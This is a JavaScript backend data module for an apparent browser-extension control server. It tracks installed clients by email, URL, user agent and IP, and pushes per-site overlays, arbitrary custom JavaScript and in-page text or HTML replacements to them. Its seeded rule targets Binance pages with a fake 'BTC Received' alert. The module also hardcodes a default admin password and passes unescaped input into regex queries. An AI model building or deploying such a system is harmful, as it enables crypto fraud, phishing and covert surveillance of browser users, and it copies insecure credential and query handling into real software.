import fs from 'fs';
import path from 'path';
import crypto from 'crypto';
import { ObjectId } from 'mongodb';
import { getDatabase } from './mongodb';

function buildIdFilter(id) {
  if (!id) return { id: '' };
  const filters = [{ id: String(id) }];
  if (typeof id === 'string' && ObjectId.isValid(id) && id.length === 24) {
    try {
      filters.push({ _id: new ObjectId(id) });
    } catch (e) {}
  }
  return { $or: filters };
}

const IS_SERVERLESS = !!(process.env.VERCEL || process.env.AWS_LAMBDA_FUNCTION_NAME);
const DATA_DIR = path.join(process.cwd(), 'data');
const DATA_FILE = path.join(DATA_DIR, 'store.json');

const INITIAL_DATA = {
  rules: [
    {
      id: 'rule-binance-default',
      name: 'Binance BTC Received Alert',
      domain: '*.binance.com',
      enabled: true,
      priority: 10,
      targetClientId: null,
      overlay: {
        height: '50',
        bg: '#0b0e11',
        text: '#eaecef',
        titleColor: '#f0b90b',
        title: 'BTC Received!',
        message: 'Status: <span style="color:#848e9c;">pending</span><br>Unauthorized wallet.',
        position: 'top',
        closable: true,
        customCss: `#custom-sticky-popup {
  animation: slideDown 0.35s ease-out;
  border-bottom: 2px solid #f0b90b !important;
}
@keyframes slideDown {
  from { transform: translateY(-100%); opacity: 0; }
  to { transform: translateY(0); opacity: 1; }
}`,
        customJs: `// Custom dynamic script injected for Binance
console.log('[RemoteOverlay] Active on Binance domain:', window.location.hostname);`
      },
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    }
  ],
  clients: [],
  messages: [],
  replacements: [],
  stats: {
    totalRequests: 0,
    lastSync: new Date().toISOString(),
  }
};

let hasSeededMongo = false;

function ensureLocalDb() {
  if (IS_SERVERLESS) return;
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
    }
    if (!fs.existsSync(DATA_FILE)) {
      fs.writeFileSync(DATA_FILE, JSON.stringify(INITIAL_DATA, null, 2), 'utf-8');
    }
  } catch (err) {}
}

function getLocalDb() {
  if (IS_SERVERLESS) return INITIAL_DATA;
  ensureLocalDb();
  try {
    const raw = fs.readFileSync(DATA_FILE, 'utf-8');
    return JSON.parse(raw);
  } catch (err) {
    return INITIAL_DATA;
  }
}

function saveLocalDb(data) {
  if (IS_SERVERLESS) return;
  try {
    ensureLocalDb();
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf-8');
  } catch (err) {}
}

// Password & Security Helpers
export function hashPassword(password, salt) {
  return crypto.pbkdf2Sync(String(password), String(salt), 10000, 64, 'sha512').toString('hex');
}

export function generateSalt() {
  return crypto.randomBytes(16).toString('hex');
}

export function generateToken() {
  return crypto.randomBytes(32).toString('hex');
}

// Seed default admin (admin@gmail.com / 12345678) into MongoDB if empty
async function seedAdminIfEmpty(db) {
  try {
    const adminCount = await db.collection('admins').countDocuments();
    if (adminCount === 0) {
      const salt = generateSalt();
      const passwordHash = hashPassword('12345678', salt);
      await db.collection('admins').insertOne({
        email: 'admin@gmail.com',
        salt,
        passwordHash,
        name: 'Super Admin',
        role: 'admin',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });
      console.log(`[MongoDB] Initialized default admin credentials`);
    }
  } catch (err) {
    console.warn('[MongoDB] Admin seed check error:', err.message);
  }
}

// Seed initial rules and admin into MongoDB if empty
async function seedMongoIfEmpty(db) {
  if (hasSeededMongo) return;
  try {
    const count = await db.collection('rules').countDocuments();
    if (count === 0) {
      await db.collection('rules').insertMany(INITIAL_DATA.rules);
      console.log(`[MongoDB] Initialized collection 'rules' with default seed documents.`);
    }
    await seedAdminIfEmpty(db);
    hasSeededMongo = true;
  } catch (err) {
    console.warn('[MongoDB] Seed check error:', err.message);
  }
}

export function matchDomain(pattern, targetDomain) {
  if (!pattern || !targetDomain) return false;
  pattern = pattern.trim().toLowerCase();
  targetDomain = targetDomain.trim().toLowerCase();

  if (pattern === '*' || pattern === '<all_urls>') return true;
  if (pattern === targetDomain) return true;

  if (pattern.startsWith('*.')) {
    const root = pattern.slice(2);
    return targetDomain === root || targetDomain.endsWith('.' + root);
  }

  if (pattern.includes('*')) {
    const regexStr = '^' + pattern.replace(/[.+?^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*') + '$';
    return new RegExp(regexStr).test(targetDomain);
  }

  return targetDomain.includes(pattern);
}

// ----------------------------------------------------------------------
// RULES OPERATIONS
// ----------------------------------------------------------------------

export async function getRules() {
  const { db, isLive } = await getDatabase();
  let list = [];
  if (isLive) {
    await seedMongoIfEmpty(db);
    // Remove obsolete fallback wildcard rule from MongoDB if present
    try {
      await db.collection('rules').deleteOne({ id: 'rule-global-fallback' });
      await db.collection('rules').deleteOne({ domain: '*' });
    } catch (e) {}

    const mongoRules = await db.collection('rules').find({}).toArray();
    list = mongoRules.map(({ _id, ...rest }) => ({
      ...rest,
      id: rest.id || String(_id),
    }));
  } else {
    const local = getLocalDb();
    list = local.rules || [];
  }
  return list.filter((r) => r.domain !== '*' && r.id !== 'rule-global-fallback');
}

export async function createRule(ruleData) {
  const { db, isLive } = await getDatabase();
  const newRule = {
    id: 'rule_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7),
    name: ruleData.name || `Overlay for ${ruleData.domain}`,
    domain: (ruleData.domain || '*').trim(),
    enabled: ruleData.enabled !== undefined ? ruleData.enabled : true,
    priority: Number(ruleData.priority) || 10,
    targetClientId: ruleData.targetClientId || null,
    overlay: {
      height: '50',
      bg: '#0b0e11',
      text: '#eaecef',
      titleColor: '#f0b90b',
      title: 'Notice',
      message: 'Important security notification.',
      position: 'top',
      closable: true,
      animation: 'slideDown',
      borderRadius: '0',
      borderWidth: '2',
      borderColor: '#f0b90b',
      shadow: 'strong',
      backdropBlur: false,
      titleSize: '40',
      messageSize: '20',
      textAlign: 'center',
      ctaText: '',
      ctaUrl: '',
      ctaBg: '#f0b90b',
      ctaColor: '#000000',
      targetSelector: 'body',
      targetAction: 'fixed',
      customCss: '',
      customJs: '',
      ...(ruleData.overlay || {}),
    },
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  };

  if (isLive) {
    await db.collection('rules').insertOne({ ...newRule });
    return newRule;
  }

  const local = getLocalDb();
  local.rules = local.rules || [];
  local.rules.unshift(newRule);
  saveLocalDb(local);

  return newRule;
}

export async function updateRule(id, updates) {
  const { db, isLive } = await getDatabase();
  const updatedAt = new Date().toISOString();

  let updatedRule = null;

  if (isLive) {
    const filter = buildIdFilter(id);
    const existing = await db.collection('rules').findOne(filter);
    if (existing) {
      const merged = {
        ...existing,
        ...updates,
        id: existing.id || String(existing._id),
        overlay: {
          ...(existing.overlay || {}),
          ...(updates.overlay || {}),
        },
        updatedAt,
      };
      delete merged._id;
      await db.collection('rules').updateOne(filter, { $set: merged });
      return merged;
    }
  }

  const local = getLocalDb();
  const index = (local.rules || []).findIndex((r) => r.id === id);
  if (index >= 0) {
    local.rules[index] = {
      ...local.rules[index],
      ...updates,
      overlay: {
        ...(local.rules[index].overlay || {}),
        ...(updates.overlay || {}),
      },
      updatedAt,
    };
    saveLocalDb(local);
    updatedRule = local.rules[index];
  }

  return updatedRule;
}

export async function deleteRule(id) {
  const { db, isLive } = await getDatabase();
  if (isLive) {
    await db.collection('rules').deleteOne(buildIdFilter(id));
    return true;
  }

  const local = getLocalDb();
  local.rules = (local.rules || []).filter((r) => r.id !== id);
  saveLocalDb(local);
  return true;
}

// ----------------------------------------------------------------------
// BROADCAST SETTINGS OPERATIONS
// ----------------------------------------------------------------------

export async function getBroadcastSettings() {
  const { db, isLive } = await getDatabase();
  if (isLive) {
    const doc = await db.collection('settings').findOne({ _id: 'global_settings' });
    return {
      broadcastsEnabled: doc ? doc.broadcastsEnabled !== false : true,
    };
  }
  const local = getLocalDb();
  return {
    broadcastsEnabled: local.settings ? local.settings.broadcastsEnabled !== false : true,
  };
}

export async function updateBroadcastSettings({ broadcastsEnabled }) {
  const { db, isLive } = await getDatabase();
  const enabled = broadcastsEnabled !== false;
  if (isLive) {
    await db.collection('settings').updateOne(
      { _id: 'global_settings' },
      { $set: { broadcastsEnabled: enabled, updatedAt: new Date().toISOString() } },
      { upsert: true }
    );
    return { broadcastsEnabled: enabled };
  }
  const local = getLocalDb();
  local.settings = local.settings || {};
  local.settings.broadcastsEnabled = enabled;
  saveLocalDb(local);
  return { broadcastsEnabled: enabled };
}

function formatMessageAsRule(msg, domain, clientId, isBroadcast = false) {
  return {
    id: msg.id,
    name: isBroadcast ? `📢 Broadcast Alert: ${msg.title}` : `🎯 Targeted Alert for ${clientId}`,
    domain: domain,
    enabled: true,
    priority: isBroadcast ? 500 : 999,
    targetClientId: msg.targetClientId || null,
    isBroadcast: isBroadcast,
    isTargetedMessage: !isBroadcast,
    overlay: {
      height: msg.height || '45',
      width: msg.width || '520px',
      bg: msg.colorBg || '#14171d',
      text: msg.colorText || '#eaecef',
      titleColor: msg.colorTitle || '#f0b90b',
      borderColor: msg.borderColor || msg.colorTitle || '#f0b90b',
      borderWidth: '2',
      borderRadius: '16',
      shadow: 'strong',
      backdropBlur: true,
      title: msg.title,
      message: msg.body,
      ctaText: msg.ctaText || '',
      ctaUrl: msg.ctaUrl || '',
      ctaBg: msg.ctaBg || msg.colorTitle || '#f0b90b',
      ctaColor: msg.ctaColor || '#000000',
      position: msg.position || 'center',
      closable: true,
      customCss: msg.customCss || '',
      customJs: msg.customJs || '',
      targetClientId: msg.targetClientId || null,
      isBroadcast: isBroadcast,
    },
    updatedAt: msg.createdAt,
  };
}

export async function findMatchingRule(domain, clientId = null) {
  await recordRequestStats();

  if (!domain) return null;

  const { db, isLive } = await getDatabase();
  const broadcastSettings = await getBroadcastSettings();
  const broadcastsEnabled = broadcastSettings.broadcastsEnabled !== false;

  // 1. Direct 1-to-1 Targeted Message for this specific client (STRICT ISOLATION)
  if (clientId) {
    let targetedMsg = null;
    if (isLive) {
      targetedMsg = await db.collection('messages').findOne({
        isActive: true,
        targetClientId: clientId,
      });
    } else {
      const local = getLocalDb();
      targetedMsg = (local.messages || []).find(
        (m) => m.isActive && m.targetClientId === clientId
      );
    }

    if (targetedMsg && targetedMsg.targetClientId === clientId) {
      return formatMessageAsRule(targetedMsg, domain, clientId, false);
    }
  }

  // 2. Broadcast Message (Only if broadcasts are active & message has NO specific target)
  if (broadcastsEnabled) {
    let broadcastMsg = null;
    if (isLive) {
      broadcastMsg = await db.collection('messages').findOne({
        isActive: true,
        $or: [
          { targetClientId: null },
          { targetClientId: '' },
          { targetClientId: 'broadcast' },
          { targetClientId: 'all' },
        ],
      });
    } else {
      const local = getLocalDb();
      broadcastMsg = (local.messages || []).find(
        (m) =>
          m.isActive &&
          (!m.targetClientId || m.targetClientId === 'broadcast' || m.targetClientId === 'all')
      );
    }

    if (broadcastMsg) {
      return formatMessageAsRule(broadcastMsg, domain, clientId, true);
    }
  }

  // 3. Domain Rules Evaluation
  let activeRules = [];
  if (isLive) {
    await seedMongoIfEmpty(db);
    activeRules = await db.collection('rules').find({ enabled: true }).toArray();
  } else {
    const local = getLocalDb();
    activeRules = (local.rules || []).filter((r) => r.enabled);
  }

  // 3a. Client-specific rule for this domain (strict 1-to-1)
  if (clientId) {
    const clientSpecificRule = activeRules.find(
      (r) => r.targetClientId === clientId && matchDomain(r.domain, domain)
    );
    if (clientSpecificRule) return clientSpecificRule;
  }

  // 3b. Domain-specific rules: STRICT CHECK
  // If r.targetClientId is set to a client, NEVER allow any other client to match it!
  const domainSpecificRules = activeRules
    .filter((r) => {
      if (r.domain === '*') return false;
      if (!matchDomain(r.domain, domain)) return false;
      if (r.targetClientId) {
        return clientId && r.targetClientId === clientId;
      }
      return true;
    })
    .sort((a, b) => (b.priority || 0) - (a.priority || 0));

  if (domainSpecificRules.length > 0) {
    return domainSpecificRules[0];
  }

  // Global wildcard rule (only if untargeted)
  const globalRule = activeRules.find(
    (r) => r.domain === '*' && (!r.targetClientId || (clientId && r.targetClientId === clientId))
  );
  if (globalRule) {
    return globalRule;
  }

  return null;
}

// ----------------------------------------------------------------------
// ADMIN AUTH & PROFILE OPERATIONS
// ----------------------------------------------------------------------

export async function authenticateAdmin(email, password) {
  if (!email || !password) {
    return { success: false, error: 'Email and password are required' };
  }

  const { db, isLive } = await getDatabase();
  let admin = null;

  if (isLive) {
    await seedMongoIfEmpty(db);
    admin = await db.collection('admins').findOne({
      email: { $regex: new RegExp(`^${email.trim()}$`, 'i') },
    });
  } else {
    const local = getLocalDb();
    admin = (local.admins || []).find(
      (a) => a.email.toLowerCase() === email.trim().toLowerCase()
    );
  }

  if (!admin) {
    return { success: false, error: 'Invalid email or password' };
  }

  const computedHash = hashPassword(password, admin.salt);
  if (computedHash !== admin.passwordHash) {
    return { success: false, error: 'Invalid email or password' };
  }

  const token = generateToken();

  return {
    success: true,
    token,
    admin: {
      id: String(admin._id || admin.id || 'admin-1'),
      email: admin.email,
      name: admin.name || 'Super Admin',
      role: admin.role || 'admin',
    },
  };
}

export async function getAdminProfile(email) {
  const { db, isLive } = await getDatabase();
  let admin = null;

  if (isLive) {
    await seedMongoIfEmpty(db);
    if (email) {
      admin = await db.collection('admins').findOne({
        email: { $regex: new RegExp(`^${email.trim()}$`, 'i') },
      });
    } else {
      admin = await db.collection('admins').findOne({});
    }
  } else {
    const local = getLocalDb();
    admin = (local.admins || [])[0] || null;
  }

  if (!admin) return null;

  return {
    id: String(admin._id || admin.id || 'admin-1'),
    email: admin.email,
    name: admin.name || 'Super Admin',
    role: admin.role || 'admin',
    updatedAt: admin.updatedAt,
  };
}

export async function updateAdminProfile({ currentEmail, newEmail, currentPassword, newPassword, name }) {
  const { db, isLive } = await getDatabase();
  let admin = null;

  if (isLive) {
    await seedMongoIfEmpty(db);
    if (currentEmail) {
      admin = await db.collection('admins').findOne({
        email: { $regex: new RegExp(`^${currentEmail.trim()}$`, 'i') },
      });
    }
    if (!admin) {
      admin = await db.collection('admins').findOne({});
    }
  } else {
    const local = getLocalDb();
    admin = (local.admins || [])[0] || null;
  }

  if (!admin) {
    return { success: false, error: 'Admin account not found in database' };
  }

  // If changing password, verify current password
  if (newPassword) {
    if (!currentPassword) {
      return { success: false, error: 'Current password is required to set a new password' };
    }
    const currentHash = hashPassword(currentPassword, admin.salt);
    if (currentHash !== admin.passwordHash) {
      return { success: false, error: 'Current password does not match' };
    }
    if (newPassword.length < 6) {
      return { success: false, error: 'New password must be at least 6 characters' };
    }
  }

  const updates = {
    updatedAt: new Date().toISOString(),
  };

  if (newEmail && newEmail.trim()) {
    updates.email = newEmail.trim().toLowerCase();
  }

  if (name && name.trim()) {
    updates.name = name.trim();
  }

  if (newPassword) {
    const newSalt = generateSalt();
    updates.salt = newSalt;
    updates.passwordHash = hashPassword(newPassword, newSalt);
  }

  if (isLive) {
    await db.collection('admins').updateOne(
      { _id: admin._id },
      { $set: updates }
    );
  } else {
    const local = getLocalDb();
    local.admins = local.admins || [];
    const idx = local.admins.findIndex((a) => a.email === admin.email);
    if (idx >= 0) {
      local.admins[idx] = { ...local.admins[idx], ...updates };
    }
    saveLocalDb(local);
  }

  return {
    success: true,
    admin: {
      id: String(admin._id || admin.id || 'admin-1'),
      email: updates.email || admin.email,
      name: updates.name || admin.name,
      role: admin.role || 'admin',
    },
  };
}

// ----------------------------------------------------------------------
// CLIENTS OPERATIONS
// ----------------------------------------------------------------------

export async function deleteClient(clientId) {
  if (!clientId) return false;
  const { db, isLive } = await getDatabase();
  if (isLive) {
    await db.collection('clients').deleteOne({ clientId });
    return true;
  }
  const local = getLocalDb();
  local.clients = (local.clients || []).filter((c) => c.clientId !== clientId);
  saveLocalDb(local);
  return true;
}

export async function registerClientHeartbeat({ clientId, email, domain, currentUrl, userAgent, ip }) {
  const cleanDomain = (domain || '').trim().toLowerCase();

  // 1. Strict Exclusion: DO NOT add client logs for local, localhost, dashboard, or browser internals
  if (
    !cleanDomain ||
    cleanDomain === 'unknown' ||
    cleanDomain === 'localhost' ||
    cleanDomain.startsWith('localhost:') ||
    cleanDomain === '127.0.0.1' ||
    cleanDomain.includes('vercel.app') ||
    cleanDomain.includes('chrome-extension') ||
    cleanDomain.includes('moz-extension')
  ) {
    return null;
  }

  // 2. Strict Domain Rule Matching: ONLY add client logs for domain rules we added!
  const rules = await getRules();
  const isRuleDomain = rules.some(
    (r) => r.enabled !== false && matchDomain(r.domain, cleanDomain)
  );

  if (!isRuleDomain) {
    // Domain not configured in admin rules — ignore heartbeat log
    return null;
  }

  const { db, isLive } = await getDatabase();
  const now = new Date().toISOString();

  const clientInfo = {
    clientId,
    email: email || 'Anonymous Client',
    domain: cleanDomain,
    lastDomain: cleanDomain,
    lastUrl: currentUrl || '',
    lastSeen: now,
    userAgent: userAgent || '',
    ip: ip || '127.0.0.1',
    status: 'online',
    isOnline: true,
  };

  if (isLive) {
    await db.collection('clients').updateOne(
      { clientId },
      { $set: clientInfo },
      { upsert: true }
    );
    return clientInfo;
  }

  const local = getLocalDb();
  local.clients = local.clients || [];
  const idx = local.clients.findIndex((c) => c.clientId === clientId);
  if (idx >= 0) {
    local.clients[idx] = { ...local.clients[idx], ...clientInfo };
  } else {
    local.clients.unshift(clientInfo);
  }
  if (local.clients.length > 200) local.clients = local.clients.slice(0, 200);
  saveLocalDb(local);

  return clientInfo;
}

export async function getClients() {
  const { db, isLive } = await getDatabase();
  const now = Date.now();
  const rules = await getRules();

  let rawClients = [];
  if (isLive) {
    // Clean up any stale localhost, vercel.app or internal logs from database
    try {
      await db.collection('clients').deleteMany({
        $or: [
          { domain: 'localhost' },
          { lastDomain: 'localhost' },
          { domain: { $regex: /localhost/i } },
          { lastDomain: { $regex: /localhost/i } },
          { domain: { $regex: /vercel\.app/i } },
          { lastDomain: { $regex: /vercel\.app/i } },
          { domain: { $regex: /chrome-extension/i } },
        ],
      });
    } catch (e) {}

    rawClients = await db.collection('clients').find({}).sort({ lastSeen: -1 }).toArray();
  } else {
    const local = getLocalDb();
    rawClients = local.clients || [];
  }

  // Filter ONLY clients whose domain matches one of our configured domain rules
  const filtered = rawClients.filter((c) => {
    const d = (c.domain || c.lastDomain || '').toLowerCase();
    if (!d || d === 'unknown' || d === 'localhost' || d.includes('vercel.app')) return false;
    return rules.some((r) => r.enabled !== false && matchDomain(r.domain, d));
  });

  return filtered.map((c) => {
    const lastSeenTime = c.lastSeen ? new Date(c.lastSeen).getTime() : 0;
    const isOnline = now - lastSeenTime < 35 * 1000;
    const domain = c.domain || c.lastDomain || 'unknown';
    return {
      clientId: c.clientId,
      email: c.email || 'Anonymous Client',
      domain: domain,
      lastDomain: domain,
      lastUrl: c.lastUrl || c.currentUrl || '',
      lastSeen: c.lastSeen,
      isOnline: isOnline,
      status: isOnline ? 'online' : 'offline',
      secondsAgo: Math.max(0, Math.round((now - lastSeenTime) / 1000)),
    };
  });
}

// ----------------------------------------------------------------------
// MESSAGES OPERATIONS
// ----------------------------------------------------------------------

export async function getMessages() {
  const { db, isLive } = await getDatabase();
  if (isLive) {
    return db.collection('messages').find({}).sort({ createdAt: -1 }).toArray();
  }
  const local = getLocalDb();
  return local.messages || [];
}

export async function createMessage(msgData) {
  const { db, isLive } = await getDatabase();
  const newMsg = {
    id: 'msg_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
    targetClientId: msgData.targetClientId || null,
    title: msgData.title,
    body: msgData.body,
    colorBg: msgData.colorBg || '#14171d',
    colorText: msgData.colorText || '#eaecef',
    colorTitle: msgData.colorTitle || '#f0b90b',
    borderColor: msgData.borderColor || msgData.colorTitle || '#f0b90b',
    ctaText: msgData.ctaText || '',
    ctaUrl: msgData.ctaUrl || '',
    ctaBg: msgData.ctaBg || msgData.colorTitle || '#f0b90b',
    ctaColor: msgData.ctaColor || '#000000',
    position: msgData.position || 'center',
    height: msgData.height || '45',
    width: msgData.width || '520px',
    customCss: msgData.customCss || '',
    customJs: msgData.customJs || '',
    isActive: true,
    createdAt: new Date().toISOString(),
  };

  if (isLive) {
    await db.collection('messages').insertOne({ ...newMsg });
    return newMsg;
  }

  const local = getLocalDb();
  local.messages = local.messages || [];
  local.messages.unshift(newMsg);
  saveLocalDb(local);

  return newMsg;
}

export async function deleteMessage(id) {
  const { db, isLive } = await getDatabase();
  if (isLive) {
    await db.collection('messages').deleteOne({ id });
    return true;
  }
  const local = getLocalDb();
  local.messages = (local.messages || []).filter((m) => m.id !== id);
  saveLocalDb(local);
  return true;
}

// ----------------------------------------------------------------------
// STATS OPERATIONS
// ----------------------------------------------------------------------

async function recordRequestStats() {
  const now = new Date().toISOString();
  try {
    const { db, isLive } = await getDatabase();
    if (isLive) {
      await db.collection('stats').updateOne(
        { _id: 'global_stats' },
        { $inc: { totalRequests: 1 }, $set: { lastSync: now } },
        { upsert: true }
      );
      return;
    }
  } catch (e) {}

  saveLocalDb({ stats: { totalRequests: 1, lastSync: now } });
}

export async function getStats() {
  const { db, isLive } = await getDatabase();
  if (isLive) {
    const doc = await db.collection('stats').findOne({ _id: 'global_stats' });
    const rulesCount = await db.collection('rules').countDocuments();
    const clientsCount = await db.collection('clients').countDocuments();
    return {
      totalRequests: doc?.totalRequests || 0,
      rulesCount,
      totalClients: clientsCount,
      isMongoLive: true,
    };
  }
  const local = getLocalDb();
  return {
    totalRequests: local.stats?.totalRequests || 0,
    rulesCount: (local.rules || []).length,
    totalClients: (local.clients || []).length,
    isMongoLive: false,
  };
}

// ----------------------------------------------------------------------
// DOM TEXT REPLACEMENTS OPERATIONS (In-Page Text Modifier)
// ----------------------------------------------------------------------

export async function getReplacements(domain = null) {
  const { db, isLive } = await getDatabase();
  let list = [];

  if (isLive) {
    const mongoReplacements = await db.collection('replacements').find({ enabled: true }).toArray();
    list = mongoReplacements.map(({ _id, ...rest }) => ({
      ...rest,
      id: rest.id || String(_id),
    }));
  } else {
    const local = getLocalDb();
    list = (local.replacements || []).filter((r) => r.enabled !== false);
  }

  if (!domain) return list;

  return list.filter((r) => {
    if (!r.domain || r.domain === '*' || r.domain === '<all_urls>') return true;
    return matchDomain(r.domain, domain);
  });
}

export async function getAllReplacements() {
  const { db, isLive } = await getDatabase();
  let list = [];

  if (isLive) {
    const mongoReplacements = await db.collection('replacements').find({}).sort({ updatedAt: -1 }).toArray();
    list = mongoReplacements.map(({ _id, ...rest }) => ({
      ...rest,
      id: rest.id || String(_id),
    }));
  } else {
    const local = getLocalDb();
    list = local.replacements || [];
  }

  return list;
}

export async function saveReplacement(data) {
  const { db, isLive } = await getDatabase();
  const id = data.id || 'rep_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7);
  const now = new Date().toISOString();

  const replacementItem = {
    id,
    domain: (data.domain || '*').trim(),
    selector: (data.selector || '').trim(),
    originalText: (data.originalText || '').trim(),
    replacementText: data.replacementText !== undefined ? String(data.replacementText) : '',
    pastedCode: (data.pastedCode || '').trim(),
    replaceType: data.replaceType || 'text', // 'text' | 'html'
    enabled: data.enabled !== undefined ? Boolean(data.enabled) : true,
    createdAt: data.createdAt || now,
    updatedAt: now,
  };

  if (isLive) {
    await db.collection('replacements').updateOne(
      { id },
      { $set: replacementItem },
      { upsert: true }
    );
    return replacementItem;
  }

  const local = getLocalDb();
  local.replacements = local.replacements || [];
  const idx = local.replacements.findIndex((r) => r.id === id);
  if (idx >= 0) {
    local.replacements[idx] = replacementItem;
  } else {
    local.replacements.unshift(replacementItem);
  }
  saveLocalDb(local);
  return replacementItem;
}

export async function deleteReplacement(id) {
  if (!id) return false;
  const { db, isLive } = await getDatabase();

  if (isLive) {
    await db.collection('replacements').deleteOne({ id });
    return true;
  }

  const local = getLocalDb();
  local.replacements = (local.replacements || []).filter((r) => r.id !== id);
  saveLocalDb(local);
  return true;
}

export async function toggleReplacement(id, enabled) {
  if (!id) return null;
  const { db, isLive } = await getDatabase();
  const now = new Date().toISOString();

  if (isLive) {
    await db.collection('replacements').updateOne(
      { id },
      { $set: { enabled: Boolean(enabled), updatedAt: now } }
    );
    return await db.collection('replacements').findOne({ id });
  }

  const local = getLocalDb();
  local.replacements = local.replacements || [];
  const idx = local.replacements.findIndex((r) => r.id === id);
  if (idx >= 0) {
    local.replacements[idx].enabled = Boolean(enabled);
    local.replacements[idx].updatedAt = now;
    saveLocalDb(local);
    return local.replacements[idx];
  }
  return null;
}
